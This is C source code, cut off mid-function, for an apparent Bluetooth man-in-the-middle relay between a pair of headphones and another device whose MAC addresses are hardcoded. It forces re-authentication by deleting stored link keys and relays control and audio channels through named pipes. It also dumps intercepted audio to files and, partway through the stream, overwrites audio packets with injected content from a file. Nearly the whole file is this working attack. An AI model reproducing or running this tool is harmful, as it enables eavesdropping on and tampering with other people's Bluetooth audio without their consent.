#include <stdio.h>
#include <stdint.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <libexplain/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>

#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>
#include <bluetooth/sdp.h>
#include <bluetooth/sdp_lib.h>
#include <bluetooth/rfcomm.h>
#include <bluetooth/sco.h>

#include "rfcomm_conn.h"
#include "sco_conn.h"
#include "l2cap_conn.h"

#define PSM_SDP    0x1
#define PSM_RFCOMM 0x3
#define PSM_AVCTP 0x17
#define PSM_AVDTP 0x19

#define AVDTP_START_ACCEPT_MSG_LEN 2
#define AVDTP_START_ACCEPT_SIGNAL 0x6

#define RECV_BUF_SIZE 2048

#define END_FLIP16(x) ((((x) & 0x00FF) << 8) | (((x) & 0xFF00) >> 8))
#define END_FLIP32(x) ((END_FLIP16((x) & 0x0000FFFF) << 16) | (END_FLIP16(((x) & 0xFFFF0000) >> 16)))

int detect_avdtp_start_accept_msg(uint8_t* buf, uint32_t len)
{
	if (len == AVDTP_START_ACCEPT_MSG_LEN)
	{
		return (AVDTP_START_ACCEPT_SIGNAL == buf[1]);
	}

	return 0;
}

uint8_t sdp_lookup_uuid_rfcomm_channel(bdaddr_t *addr, uint16_t wanted_uuid)
{
	uuid_t uuid;
	sdp_list_t *sdp_res, *sdp_search, *sdp_wanted_attr;
	sdp_session_t *sdp_session;
	uint32_t wanted_attr_range = 0xFFFF;
	bdaddr_t bdaddr = *addr;
	uint8_t rfcomm_channel = 0;
	int err;

	sdp_session = sdp_connect(BDADDR_ANY, &bdaddr, SDP_RETRY_IF_BUSY);

	if (NULL != sdp_session)
		printf("Connected to target SDP server\n");

	sdp_uuid16_create(&uuid, wanted_uuid);

	sdp_search = sdp_list_append( NULL, &uuid );
    	sdp_wanted_attr = sdp_list_append( NULL, &wanted_attr_range );

	// get a list of service records that have UUID 0xabcd
	err = sdp_service_search_attr_req(sdp_session, sdp_search, SDP_ATTR_REQ_RANGE, sdp_wanted_attr, &sdp_res);
	
	printf("SDP service search result: %p\n", sdp_res);

	sdp_list_t *r = sdp_res;

	// go through each of the service records
	for (; r; r = r->next ) 
	{
		sdp_record_t *rec = (sdp_record_t*) r->data;
		sdp_list_t *proto_list;
		
		// get a list of the protocol sequences
		if( sdp_get_access_protos( rec, &proto_list ) == 0 ) {
		sdp_list_t *p = proto_list;

		// go through each protocol sequence
		for( ; p ; p = p->next ) {
		    sdp_list_t *pds = (sdp_list_t*)p->data;

		    // go through each protocol list of the protocol sequence
		    for( ; pds ; pds = pds->next ) {

		        // check the protocol attributes
		        sdp_data_t *d = (sdp_data_t*)pds->data;
		        int proto = 0;
		        for( ; d; d = d->next ) {
		            switch( d->dtd ) { 
		                case SDP_UUID16:
		                case SDP_UUID32:
		                case SDP_UUID128:
		                    proto = sdp_uuid_to_proto( &d->val.uuid );
					printf("Proto: %d\n", proto);
		                    break;
		                case SDP_UINT8:
		                    if( proto == RFCOMM_UUID ) 
				    {
					rfcomm_channel = d->val.int8;
		                        printf("Found RFCOMM channel: %d\n",d->val.int8);
		                    }
		                    break;
		            }
		        }
		    }

		    sdp_list_free( (sdp_list_t*)p->data, 0 );
		}
		
		sdp_list_free( proto_list, 0 );

		}

		sdp_record_free( rec );
	}

	sdp_close(sdp_session);

	return rfcomm_channel;
}

void main()
{
	// ------ Pairing stuff ------
	// "00:11:67:F8:8A:D1" - JAM Headphones
	// "FC:58:FA:3A:49:08" - Perchik's bluetooth speaker
	const char* dest1_mac = "00:11:67:F8:8A:D1";
	const char* dest2_mac = "78:D7:5F:A2:7E:4A";
	const char* local_mac = "00:01:95:27:45:51";

	bdaddr_t bdaddr1, bdaddr2;
	int dev_id = 0, dev_sock = 0, err, attempts;
	uint16_t conn1_handle, conn2_handle;

	uint16_t packet_type;
	struct hci_conn_info_req *conn_info_request;
	struct hci_dev_info dev_info;

	// SDP stuff
	uint16_t headset_uuid16 = 0x1108;
	uint16_t headset_gate_uuid16 = 0x1112;
	uint16_t hfp_gate_uuid16 = 0x111F;
	uint16_t hfp_uuid16 = 0x111E;
	uint16_t a2dp_src_uuid16 = 0x110A;	
	uint16_t a2dp_sink_uuid16 = 0x110B;

	// RFCOMM/SCO stuff
	struct sockaddr_rc remote1, remote2;
	struct sockaddr_rc local;
	struct sockaddr_sco sco_remote;
	struct sco_options sco_conn_options;
	wanted_rfcomm_sock_res server_rfcomm_sock;
	socklen_t optlen;
	// RFCOMM Channels:
	// iPhone: 8
	// JAM Headphones: 1
	// Perchik speakers: 3

	int rfcomm_sock1 = -1, rfcomm_sock2 = -1, rfcomm_channel1 = 1, rfcomm_channel2 = 8, sco_sock, sco_conn_enabled = 0;
	int32_t recv_len = 0, packet_seq, audio_i, pkt_i, audio1_sent_amt = 0;
	uint8_t* recv_buf = (uint8_t*)malloc(RECV_BUF_SIZE);
	int sco_sock1 = -1, sco_sock2 = -1;
	int is_server = 0;

	int ag2hs, hs2ag, ag2hs_sco, hs2ag_sco, ag2hs_sdp, hs2ag_sdp, ag2hs_avctp, hs2ag_avctp, ag2hs_avdtp, hs2ag_avdtp, ag2hs_audio, hs2ag_audio;

	// L2CAP stuff
	int avdtp_sock1, avdtp_sock2, avctp_sock1, avctp_sock2, audio_sock1, audio_sock2, sdp_sock1, sdp_sock2, connected = 0, sdp_chann_enabled, audio_sock1_imtu, audio_sock1_omtu = DEFAULT_L2CAP_MTU, sdp1_omtu, sdp1_imtu;
	l2cap_sock_info sdp_sock_res, rfcomm_sock_res, server_avctp_sock_res, server_avdtp_sock_res;
	uint8_t *l2cap_buf = (uint8_t*)malloc(1500);
	FILE* test_audio_file = NULL;

	FILE* haxed_audio_file = fopen("audiodump_in.sbc", "rb");

	str2ba(dest1_mac, &bdaddr1);
	str2ba(dest2_mac, &bdaddr2);

	dev_id = hci_get_route(NULL);
	dev_sock = hci_open_dev(dev_id);

	printf("Looking up device RFCOMM channels...\n");

	// Find RFCOMM channels on both devices
	//rfcomm_channel1 = sdp_lookup_uuid_rfcomm_channel(&bdaddr1, hfp_uuid16);
	//rfcomm_channel2 = sdp_lookup_uuid_rfcomm_channel(&bdaddr2, hfp_gate_uuid16);

	printf("Audio source: %u, Audio sink: %u\n", rfcomm_channel2, rfcomm_channel1);

	// Get connection handles to both entities
	/*if ((err = ioctl(dev_sock, HCIGETCONNINFO, (unsigned long)conn_info_request)) < 0)*/
	
	if (-1 == hci_devinfo(dev_id, &dev_info))
	{
		printf("Failed to get devinfo\n");
		goto cleanup;
	}	

	packet_type = htobs(dev_info.pkt_type & ACL_PTYPE_MASK);

	printf("Connecting to dev1...\n");

	if (-1 == hci_create_connection(dev_sock, &bdaddr1, packet_type, 0, 1, &conn1_handle, 25000)) 
	{
		printf("Failed to manually create connection 1\n");
		goto cleanup;
	}

	if ((err = hci_authenticate_link(dev_sock, htobs(conn1_handle), 10000)) < 0)
	{
		printf("Failed to authenticate link 1 (%d)\n", err);

		if ((err = hci_delete_stored_link_key(dev_sock, &bdaddr1, 1, 1000)) < 0)
		{
			printf("Failed to clear link 1 keys...\n");
			goto cleanup;
		}
		
		if ((err = hci_change_link_key(dev_sock, htobs(conn1_handle), 5000)) < 0)
		{
			printf("Failed to change link 1 key\n");
			goto cleanup;
		}

		printf("Cleared link1 keys, attempting auth again...\n");

		if ((err = hci_authenticate_link(dev_sock, htobs(conn1_handle), 10000)) < 0)
		{
			printf("Failed to reauthenticate link 1 (%d)\n", err);
			goto cleanup;
		}
	}

	if ((err = hci_encrypt_link(dev_sock, htobs(conn1_handle), 1, 10000)) < 0)
	{
		printf("Failed to encrypt link 1\n");
		goto cleanup;
	}

	printf("Dev1 secured\n");

	sleep(3);

	printf("Connecting to dev2...\n");

	if (-1 == hci_create_connection(dev_sock, &bdaddr2, packet_type, 0, 1, &conn2_handle, 25000)) 
	{
		printf("Failed to manually create connection 2\n");
		goto cleanup;
	}

	if ((err = hci_authenticate_link(dev_sock, htobs(conn2_handle), 10000)) < 0)
	{
		printf("Failed to authenticate link 2 (%d)\n", err);

		if ((err = hci_delete_stored_link_key(dev_sock, &bdaddr2, 1, 1000)) < 0)
		{
			printf("Failed to clear link 1 keys...\n");
			goto cleanup;
		}
		
		printf("Cleared link2 keys, attempting auth again...\n");

		if ((err = hci_change_link_key(dev_sock, htobs(conn2_handle), 5000)) < 0)
		{
			printf("Failed to change link 2 key\n");
			goto cleanup;
		}

		if ((err = hci_authenticate_link(dev_sock, htobs(conn2_handle), 10000)) < 0)
		{
			printf("Failed to reauthenticate link 2 (%d)\n", err);
			goto cleanup;
		}

	}

	if ((err = hci_encrypt_link(dev_sock, htobs(conn2_handle), 1, 10000)) < 0)
	{
		printf("Failed to encrypt link 2\n");
		goto cleanup;
	}

	printf("Dev2 secured\n");
	printf("Got connection handles: <%s, %u>, <%s, %u>\n", dest1_mac, conn1_handle, dest2_mac, conn2_handle);

	printf("Disconnecting ACL connections to connect via RFCOMM...\n");

	hci_disconnect(dev_sock, conn1_handle, HCI_OE_USER_ENDED_CONNECTION, 3000);
	hci_disconnect(dev_sock, conn2_handle, HCI_OE_USER_ENDED_CONNECTION, 3000);

	printf("Waiting for HCI to finish disconnecting...\n");
	sleep(1);

	printf("Initiating RFCOMM Communications\n");
/*
	rfcomm_sock1 = socket(AF_BLUETOOTH, SOCK_STREAM, BTPROTO_RFCOMM);	
	remote1.rc_family = AF_BLUETOOTH;
	remote1.rc_channel = rfcomm_channel1;
	str2ba(dest1_mac, &remote1.rc_bdaddr);

	for (attempts = 0, err = -1; attempts < 3 && err < 0; attempts++)
	{
		if ((err = connect(rfcomm_sock1, (struct sockaddr *)&remote1, sizeof(struct sockaddr_rc))) < 0)
		{
			printf("Failed to connect RFCOMM 1 (%d)\n", err);
		}
	}
	if (err < 0) goto rfcomm_sock_cleanup;
*/

/*
	rfcomm_sock_res.psm = PSM_RFCOMM;
	rfcomm_sock_res.res_sock = -1;

	printf("Waiting for phone on L2CAP...\n");

	start_l2cap_conn_wait(&rfcomm_sock_res);
	while (rfcomm_sock_res.res_sock <0);

	printf("Accepted on l2cap!\n");

	rfcomm_sock2 = rfcomm_sock_res.res_sock;
*/	
/*
	rfcomm_sock2 = socket(AF_BLUETOOTH, SOCK_STREAM, BTPROTO_RFCOMM);	
	remote2.rc_family = AF_BLUETOOTH;
	remote2.rc_channel = rfcomm_channel2;
	str2ba(dest2_mac, &remote2.rc_bdaddr);

	for (attempts = 0, err = -1; attempts < 3 && err < 0; attempts++)
	{
		if ((err = connect(rfcomm_sock2, (struct sockaddr *)&remote2, sizeof(struct sockaddr_rc))) < 0)
		{
			printf("Failed to connect RFCOMM 2 (%d)\n", err);
		}
	}

	if (err < 0) goto rfcomm_sock_cleanup;
*/
/*
	rfcomm_sock1 = connect_l2cap(dest1_mac, PSM_RFCOMM);
	rfcomm_sock2 = connect_l2cap(dest2_mac, PSM_RFCOMM);

	if (rfcomm_sock1 <= 0 || rfcomm_sock2 <= 0)
	{
		printf("Failed to connect RFCOMM/L2CAP. %d - %d\n", rfcomm_sock1, rfcomm_sock2);
		goto rfcomm_sock_cleanup;
	}
*/

//	printf("RFCOMM communications started. Setting to nonblocking I/O.\n");
/*
	if (fcntl(rfcomm_sock1, F_SETFL, O_NONBLOCK) < 0)
	{
		printf("Failed to make RFCOMM socket nonblocking\n");
		goto rfcomm_sock_cleanup;
	}

	if (fcntl(rfcomm_sock2, F_SETFL, O_NONBLOCK) < 0)
	{
		printf("Failed to make RFCOMM socket nonblocking\n");
		goto rfcomm_sock_cleanup;
	}
*/
	avdtp_sock1 = avdtp_sock2 = avctp_sock1 = avctp_sock2 = sdp_sock1 = sdp_sock2 = -1;
/*
	printf("Attempting to connect L2CAP sockets...\n");

	printf("Side 1 AVDTP/AVCTP...\n");

	avdtp_sock1 = connect_l2cap(dest1_mac, PSM_AVDTP);
	avctp_sock1 = connect_l2cap(dest1_mac, PSM_AVCTP);

	if (avdtp_sock1 < 0 || avctp_sock1 < 0)
	{
		printf("Failed to setup L2CAP links... %d - %d\n", avctp_sock1, avdtp_sock1);
		goto l2cap_sock_cleanup;	
	}

	printf("Side 2 AVDTP/AVCTP...\n");

	avdtp_sock2 = connect_l2cap(dest2_mac, PSM_AVDTP);
	avctp_sock2 = connect_l2cap(dest2_mac, PSM_AVCTP);

	if (avdtp_sock2 < 0 || avctp_sock2 < 0)
	{
		printf("Failed to setup L2CAP links... %d - %d\n", avctp_sock1, avdtp_sock1);
		goto l2cap_sock_cleanup;	
	}
*/
	//start_sco_conn_wait(&sco_sock2);

	sdp_sock_res.psm = PSM_SDP;
	sdp_sock_res.res_sock = -1;
	start_l2cap_conn_wait(&sdp_sock_res);

	server_avctp_sock_res.psm = PSM_AVCTP;
	server_avdtp_sock_res.psm = PSM_AVDTP;

	start_l2cap_conn_wait(&server_avctp_sock_res);
	start_l2cap_conn_wait(&server_avdtp_sock_res);

	//start_sco_conn_wait(&sco_sock2);
	server_rfcomm_sock.res_sock = -1;
	server_rfcomm_sock.channel = rfcomm_channel1;
	//start_rfcomm_conn_wait(&server_rfcomm_sock);

	sdp_chann_enabled = 0;
	sco_conn_enabled = 0;

	sco_sock1 = sdp_sock1 = -1;

	is_server = 0;

	rfcomm_sock2 = connect_rfcomm(dest2_mac, local_mac, rfcomm_channel2);
	printf("Opened AG RFCOMM connection\n");

	// Make pipes
	if (0 > mknod("bt_hs2ag", S_IFIFO | 0666, 0))
	{
		printf("Failed to open pipe :(\n");
		goto rfcomm_sock_cleanup;
	}

	if (0 > mknod("bt_ag2hs", S_IFIFO | 0666, 0))
	{
		printf("Failed to open pipe :(\n");
		goto rfcomm_sock_cleanup;
	}

	if (0 > mknod("bt_hs2ag_sco", S_IFIFO | 0666, 0))
	{
		printf("Failed to open pipe :(\n");
		goto rfcomm_sock_cleanup;
	}

	if (0 > mknod("bt_ag2hs_sco", S_IFIFO | 0666, 0))
	{
		printf("Failed to open pipe :(\n");
		goto rfcomm_sock_cleanup;
	}

	if (0 > mknod("bt_hs2ag_sdp", S_IFIFO | 0666, 0))
	{
		printf("Failed to open pipe :(\n");
		goto rfcomm_sock_cleanup;
	}

	if (0 > mknod("bt_ag2hs_sdp", S_IFIFO | 0666, 0))
	{
		printf("Failed to open pipe :(\n");
		goto rfcomm_sock_cleanup;
	}

	if (0 > mknod("bt_hs2ag_avctp", S_IFIFO | 0666, 0))
	{
		printf("Failed to open pipe :(\n");
		goto rfcomm_sock_cleanup;
	}

	if (0 > mknod("bt_ag2hs_avctp", S_IFIFO | 0666, 0))
	{
		printf("Failed to open pipe :(\n");
		goto rfcomm_sock_cleanup;
	}

	if (0 > mknod("bt_hs2ag_avdtp", S_IFIFO | 0666, 0))
	{
		printf("Failed to open pipe :(\n");
		goto rfcomm_sock_cleanup;
	}

	if (0 > mknod("bt_ag2hs_avdtp", S_IFIFO | 0666, 0))
	{
		printf("Failed to open pipe :(\n");
		goto rfcomm_sock_cleanup;
	}

	if (0 > mknod("bt_hs2ag_audio", S_IFIFO | 0666, 0))
	{
		printf("Failed to open pipe :(\n");
		goto rfcomm_sock_cleanup;
	}

	if (0 > mknod("bt_ag2hs_audio", S_IFIFO | 0666, 0))
	{
		printf("Failed to open pipe :(\n");
		goto rfcomm_sock_cleanup;
	}

	printf("Forking!\n");

	ag2hs = hs2ag = NULL;

	if (fork())
	{
		is_server = 1;
		sco_sock2 = -2;

		ag2hs = open("bt_ag2hs", O_WRONLY | O_CREAT, 0666);
		hs2ag = open("bt_hs2ag", O_NONBLOCK | O_CREAT, 0666);
		ag2hs_sco = open("bt_ag2hs_sco", O_WRONLY | O_NONBLOCK | O_CREAT, 0666);
		hs2ag_sco = open("bt_hs2ag_sco", O_NONBLOCK | O_CREAT, 0666);
		ag2hs_sdp = open("bt_ag2hs_sdp", O_WRONLY | O_CREAT, 0666);
		hs2ag_sdp = open("bt_hs2ag_sdp", O_NONBLOCK | O_CREAT, 0666);
		ag2hs_avctp = open("bt_ag2hs_avctp", O_WRONLY | O_CREAT, 0666);
		hs2ag_avctp = open("bt_hs2ag_avctp", O_NONBLOCK | O_CREAT, 0666);
		ag2hs_avdtp = open("bt_ag2hs_avdtp", O_WRONLY | O_CREAT, 0666);
		hs2ag_avdtp = open("bt_hs2ag_avdtp", O_NONBLOCK | O_CREAT, 0666);
		ag2hs_audio = open("bt_ag2hs_audio", O_WRONLY | O_CREAT, 0666);
		hs2ag_audio = open("bt_hs2ag_audio", O_NONBLOCK | O_CREAT, 0666);

		if (fcntl(ag2hs_audio, F_SETFL, O_NONBLOCK) < 0)
		{
			printf("Failed to make ag2hs_audio fifo nonblocking\n");
		}

		printf("Server starting\n");
/*
		accepter = socket(AF_BLUETOOTH, SOCK_STREAM, BTPROTO_RFCOMM);
		remote2.rc_family = AF_BLUETOOTH;
		remote2.rc_channel = rfcomm_channel2;
		remote2.rc_bdaddr = *BDADDR_ANY;

		printf("Waiting on RFCOMM2\n");

		if (bind(accepter, (struct sockaddr*)&remote2, sizeof(struct sockaddr_rc)) < 0) printf("Failed to bind rfcomm\n");
		if (listen(accepter, 1) < 0) printf("Failed to listen on rfcomm\n");
		accepterlen = sizeof(struct sockaddr_rc);
		rfcomm_sock2 = accept(accepter, (struct sockaddr*)&remote2, &accepterlen);
		close(accepter);

		rfcomm_sock2 = socket(AF_BLUETOOTH, SOCK_STREAM, BTPROTO_RFCOMM);	
		remote2.rc_family = AF_BLUETOOTH;
		remote2.rc_channel = rfcomm_channel2;
		 

		str2ba(dest2_mac, &remote2.rc_bdaddr);

		for (attempts = 0, err = -1; attempts < 3 && err < 0; attempts++)
		{
			if ((err = connect(rfcomm_sock2, (struct sockaddr *)&remote2, sizeof(struct sockaddr_rc))) < 0)
			{
				printf("Failed to connect RFCOMM 2 (%d)\n", err);
			}
		}

		printf("Opened AG RFCOMM sock\n");

		if (fcntl(rfcomm_sock2, F_SETFL, O_NONBLOCK) < 0)
		{
			printf("Failed to make RFCOMM socket nonblocking\n");
			goto rfcomm_sock_cleanup;
		}
*/
	}
	else
	{
		is_server = 0;

		sleep(2);

		ag2hs = open("bt_ag2hs", O_NONBLOCK, 0666);
		hs2ag = open("bt_hs2ag", O_WRONLY, 0666);
		ag2hs_sco = open("bt_ag2hs_sco", O_NONBLOCK, 0666);
		hs2ag_sco = open("bt_hs2ag_sco", O_WRONLY, 0666);
		ag2hs_sdp = open("bt_ag2hs_sdp", O_NONBLOCK, 0666);
		hs2ag_sdp = open("bt_hs2ag_sdp", O_WRONLY, 0666);
		ag2hs_avctp = open("bt_ag2hs_avctp", O_NONBLOCK, 0666);
		hs2ag_avctp = open("bt_hs2ag_avctp", O_WRONLY, 0666);
		ag2hs_avdtp = open("bt_ag2hs_avdtp", O_NONBLOCK, 0666);
		hs2ag_avdtp = open("bt_hs2ag_avdtp", O_WRONLY, 0666);
		ag2hs_audio = open("bt_ag2hs_audio", O_NONBLOCK, 0666);
		hs2ag_audio = open("bt_hs2ag_audio", O_WRONLY, 0666);

		printf("Client starting\n");

		rfcomm_sock1 = connect_rfcomm(dest1_mac, local_mac, rfcomm_channel1);
		printf("Opened HS RFCOMM connection\n");

/*
		rfcomm_sock1 = socket(AF_BLUETOOTH, SOCK_STREAM, BTPROTO_RFCOMM);	
		remote1.rc_family = AF_BLUETOOTH;
		remote1.rc_channel = rfcomm_channel1;
		str2ba(dest1_mac, &remote1.rc_bdaddr);

		for (attempts = 0, err = -1; attempts < 3 && err < 0; attempts++)
		{
			if ((err = connect(rfcomm_sock1, (struct sockaddr *)&remote1, sizeof(struct sockaddr_rc))) < 0)
			{
				printf("Failed to connect RFCOMM 1 (%d)\n", err);
			}
		}

		printf("Opened HS RFCOMM sock\n");
	
		if (fcntl(rfcomm_sock1, F_SETFL, O_NONBLOCK) < 0)
		{
			printf("Failed to make RFCOMM socket nonblocking\n");
			goto rfcomm_sock_cleanup;
		}
*/
	}

	//printf("Got FIFO FDs: %d %d\n", ag2hs, hs2ag);

/*	
	if (0 > (err = fcntl(ag2hs, F_SETFL, O_NONBLOCK)))
	{
		printf("Failed to make AG2HS nonblocking (%d - %s)\n", errno, strerror(errno));
	}

	if (0 > (err = fcntl(hs2ag, F_SETFL, O_NONBLOCK)))
	{
		printf("Failed to make HS2AG nonblocking (%d - %s)\n", errno, strerror(errno));
	}
*/

	while (1)
	{
	if (is_server)
	{
		if (-2 == sco_sock2)
		{
			sco_sock2 = -1;
			start_sco_conn_wait(&sco_sock2);
		}

		if (sdp_sock_res.res_sock != -1)
		{
			printf("We have been SDP queried! - %d\n", sdp_sock_res.res_sock);
			sdp_sock2 = sdp_sock_res.res_sock;
			sdp_sock_res.res_sock = -1;
		}

		/*if (server_rfcomm_sock.res_sock != -1)
		{
			printf("Received server RFCOMM connection!\n");
			rfcomm_sock2 = server_rfcomm_sock.res_sock;
			server_rfcomm_sock.res_sock = -1;
		}*/

		if ((recv_len = recv(rfcomm_sock2, recv_buf, RECV_BUF_SIZE, 0)) > 0)
		{
			//send(rfcomm_sock2, recv_buf, recv_len, 0);
			if (write(ag2hs, recv_buf, recv_len) < 0) printf("write failed\n");

			printf("RFCOMM2 -> RFCOMM1: %s\n", recv_buf);

			memset(recv_buf, 0, RECV_BUF_SIZE);
		}	

		if ((recv_len = read(hs2ag, recv_buf, RECV_BUF_SIZE)) > 0)
		{
			printf("HS2AG: %s\n", recv_buf);

			send(rfcomm_sock2, recv_buf, recv_len, 0);
			memset(recv_buf, 0, RECV_BUF_SIZE);
		}

		if ((recv_len = read(hs2ag_sdp, recv_buf, RECV_BUF_SIZE)) > 0)
		{
			printf("HS2AG_SDP: %d bytes\n", recv_len);

			if (send(sdp_sock2, recv_buf, recv_len, 0) < 0) printf("sdp_sock2 send failed\n");
			memset(recv_buf, 0, RECV_BUF_SIZE);
		}

		if (-1 != sdp_sock2)
		{
			if ((recv_len = recv(sdp_sock2, recv_buf, RECV_BUF_SIZE, 0)) > 0)
			{
				printf("SDP2->SDP1: %d bytes\n", recv_len);
				write(ag2hs_sdp, recv_buf, recv_len);
				memset(recv_buf, 0, RECV_BUF_SIZE);
			}
		}

		if (server_avctp_sock_res.res_sock != -1 && -1 == avctp_sock2)
		{
			//close(sdp_sock2);
			printf("AG initiated AVCTP channel!\n");
			avctp_sock2 = server_avctp_sock_res.res_sock;
			server_avctp_sock_res.res_sock = -1;
		}

		if (-1 != avctp_sock2)
		{
			if ((recv_len = recv(avctp_sock2, recv_buf, RECV_BUF_SIZE, 0)) > 0)
			{
				printf("AVCTP2->AVCTP1 [%d bytes]\n", recv_len);
				write(ag2hs_avctp, recv_buf, recv_len);
				memset(recv_buf, 0, RECV_BUF_SIZE);
			}

			if ((recv_len = read(hs2ag_avctp, recv_buf, RECV_BUF_SIZE)) > 0)
			{
				printf("HS2AG_AVCTP: %d bytes\n", recv_len);

				if (send(avctp_sock2, recv_buf, recv_len, 0) < 0) printf("avctp_sock2 send failed\n");
				memset(recv_buf, 0, RECV_BUF_SIZE);
			}
		}

		if (server_avdtp_sock_res.res_sock != -1 && -1 == avdtp_sock2)
		{
			printf("AG initiated AVDTP channel!\n");
			avdtp_sock2 = server_avdtp_sock_res.res_sock;
			server_avdtp_sock_res.res_sock = -2;
			sleep(1);
		}

		if (-1 != avdtp_sock2)
		{
			if (-2 == server_avdtp_sock_res.res_sock)
			{
				server_avdtp_sock_res.res_sock = -1;
				server_avdtp_sock_res.psm = PSM_AVDTP;

				start_l2cap_conn_wait(&server_avdtp_sock_res);
			}

			if (server_avdtp_sock_res.res_sock != -1)
			{
				printf("AVDTP Audio channel opened!\n");
				audio_sock2 = server_avdtp_sock_res.res_sock;
				server_avdtp_sock_res.res_sock = -1;
			}

			if ((recv_len = recv(avdtp_sock2, recv_buf, RECV_BUF_SIZE, 0)) > 0)
			{
				printf("AVDTP2->AVDTP1 [%d bytes]\n", recv_len);
				write(ag2hs_avdtp, recv_buf, recv_len);
				memset(recv_buf, 0, RECV_BUF_SIZE);
			}

			if ((recv_len = read(hs2ag_avdtp, recv_buf, RECV_BUF_SIZE)) > 0)
			{
				//printf("HS2AG_AVDTP: %d bytes\n", recv_len);

				if (send(avdtp_sock2, recv_buf, recv_len, 0) < 0) printf("avdtp_sock2 send failed\n");
				memset(recv_buf, 0, RECV_BUF_SIZE);
			}
		}

		if (-1 != audio_sock2)
		{
			if ((recv_len = recv(audio_sock2, recv_buf, 608, 0)) > 0)
			{
				//printf("AUDIO2->AUDIO1 [%d bytes]\n", recv_len);
				if (NULL == test_audio_file) test_audio_file = fopen("audiodump.sbc", "wb");
				fwrite(recv_buf+12, 1, recv_len-12, test_audio_file);
				/*printf("AUDPKT RTP: %02x %02x %d %d %08x\n", recv_buf[0], recv_buf[1], END_FLIP16(*((uint16_t*)&recv_buf[2])), END_FLIP32(*((uint32_t*)&recv_buf[4])), *((uint32_t*)&recv_buf[8]));*/
				int sequence = END_FLIP16(*((uint16_t*)&recv_buf[2]));
				if (sequence > 500)
				{
					int rb = fread(recv_buf+12, 1, recv_len - 12, haxed_audio_file);
					printf("Injected %d bytes into stream! %02x%02x%02x%02x\n", rb, recv_buf[16], recv_buf[17], recv_buf[18], recv_buf[19]);
				}

				if (write(ag2hs_audio, recv_buf, recv_len) < 0) printf("Failed to write to ag2hs_audio[err %u - %s]\n", errno, strerror(errno));
				memset(recv_buf, 0, RECV_BUF_SIZE);
				usleep(1);
			}

			if ((recv_len = read(hs2ag_audio, recv_buf, RECV_BUF_SIZE)) > 0)
			{
				//printf("HS2AG_AUDIO: %d bytes\n", recv_len);

				if (send(audio_sock2, recv_buf, recv_len, 0) < 0) printf("avctp_sock2 send failed\n");
				memset(recv_buf, 0, RECV_BUF_SIZE);
			}
		}

		if (0 < sco_sock2)
		{
			if ((recv_len = recv(sco_sock2, recv_buf, DEFAULT_SCO_MTU, 0)) > 0)
			{
				printf("SCO2->SCO1 [%u bytes]\n", recv_len);
				if (write(ag2hs_sco, recv_buf, recv_len) < 0) printf("ag2hs_sco write failed\n");
			
				if (NULL == test_audio_file) test_audio_file = fopen("test.pcm", "wb");
				fwrite(recv_buf, 1, recv_len, test_audio_file);

				memset(recv_buf, 0, RECV_BUF_SIZE); 
			}
			
			if ((recv_len = read(hs2ag_sco, recv_buf, DEFAULT_SCO_MTU)) > 0)
			{
				printf("HS2AG_SCO: %u bytes to SCO!\n", recv_len);
				//printf("^");
				if (recv_len <= DEFAULT_SCO_MTU)
				{
					if (err = send(sco_sock2, recv_buf, recv_len, 0) < 0) printf("sco2 send failed (%d - %s) [%d bytes]\n", errno, strerror(errno), recv_len);
					usleep(500);
				}
				else
				{
					send_sco_fragmented(sco_sock2, recv_buf, recv_len, DEFAULT_SCO_MTU);
				}

				printf("^");
				memset(recv_buf, 0, RECV_BUF_SIZE);
			}
		}
	}
	else
	{
		if ((recv_len = read(ag2hs_avctp, recv_buf, RECV_BUF_SIZE)) > 0)
		{
			printf("AG2HS_AVCTP: %d bytes\n", recv_len);

			if (-1 == avctp_sock1)
			{
				//close(sdp_sock1);
				avctp_sock1 = connect_l2cap(dest1_mac, PSM_AVCTP, NULL, NULL);
			}
		
			if (send(avctp_sock1, recv_buf, recv_len, 0) < 0) printf("avctp_sock1 send failed\n");
			memset(recv_buf, 0, RECV_BUF_SIZE);
		}

		if (-1 != avctp_sock1)
		{
			if ((recv_len = recv(avctp_sock1, recv_buf, RECV_BUF_SIZE, 0)) > 0)
			{
				printf("AVCTP1->AVCTP2: %d bytes\n", recv_len);
				write(hs2ag_avctp, recv_buf, recv_len);
				memset(recv_buf, 0, RECV_BUF_SIZE);
			}
		}

		if ((recv_len = read(ag2hs_avdtp, recv_buf, RECV_BUF_SIZE)) > 0)
		{
			printf("AG2HS_AVDTP: %d bytes\n", recv_len);

			if (-1 == avdtp_sock1)
				avdtp_sock1 = connect_l2cap(dest1_mac, PSM_AVDTP, NULL, NULL);
		
			if (send(avdtp_sock1, recv_buf, recv_len, 0) < 0) printf("avdtp_sock1 send failed\n");

			memset(recv_buf, 0, RECV_BUF_SIZE);
		}

		if (-1 != avdtp_sock1)
		{
			if ((recv_len = recv(avdtp_sock1, recv_buf, RECV_BUF_SIZE, 0)) > 0)
			{
				printf("AVDTP1->AVDTP2: %d bytes\n", recv_len);
				write(hs2ag_avdtp, recv_buf, recv_len);
			
				if (detect_avdtp_start_accept_msg(recv_buf, recv_len))
				{
					printf("Detected START ACCEPT message!\n");
					audio_sock1 = connect_l2cap(dest1_mac, PSM_AVDTP, &audio_sock1_omtu, &audio_sock1_imtu);
					if (audio_sock1_omtu > DEFAULT_L2CAP_MTU && 0)
					{
						printf("Downsizing mtu for audio sock1\n");
						audio_sock1_omtu = DEFAULT_L2CAP_MTU;
						set_l2cap_sock_mtu(audio_sock1, DEFAULT_L2CAP_MTU, 0);
					}			
				}

				memset(recv_buf, 0, RECV_BUF_SIZE);
			}
		}

		if ((recv_len = recv(rfcomm_sock1, recv_buf, RECV_BUF_SIZE, 0)) > 0)
		{
			printf("RFCOMM1 -> RFCOMM2: %s\n", recv_buf);
			write(hs2ag, recv_buf, recv_len);
			//send(rfcomm_sock1, recv_buf, recv_len, 0);

			if (NULL != strcasestr(recv_buf, "CLCC") && 0)
			{
				if (-1 == sco_sock1)
				{
					printf("Tiem to open conn to headset!\n");
					sco_sock1 = connect_sco(dest1_mac, local_mac);

					memset(&sco_conn_options, 0, sizeof(struct sco_options));
					optlen = sizeof(struct sco_options);

					if (getsockopt(sco_sock1, SOL_SCO, SCO_OPTIONS, &sco_conn_options, &optlen) < 0)
					{
						printf("Failed to get sock options...\n");
					}

					printf("SCO Link1 mtu: %u\n", sco_conn_options.mtu);
